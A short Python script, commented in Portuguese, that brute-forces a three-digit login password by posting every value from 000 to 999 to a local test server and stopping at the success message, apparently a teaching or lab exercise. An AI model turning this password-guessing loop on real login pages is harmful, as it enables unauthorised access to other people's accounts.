import requests

url = "http://127.0.0.1:5000/login"

encontrada = False

for tentativa in range(1000):

    senha = str(tentativa).zfill(3)

    dados = {
        "senha": senha
    }

    resposta = requests.post(url, data=dados)

    print("Testando senha:", senha)

    if resposta.text == "Login realizado com sucesso!":
        print("Senha encontrada:", senha)
        encontrada = True
        break

if not encontrada:
    print("Senha não encontrada!")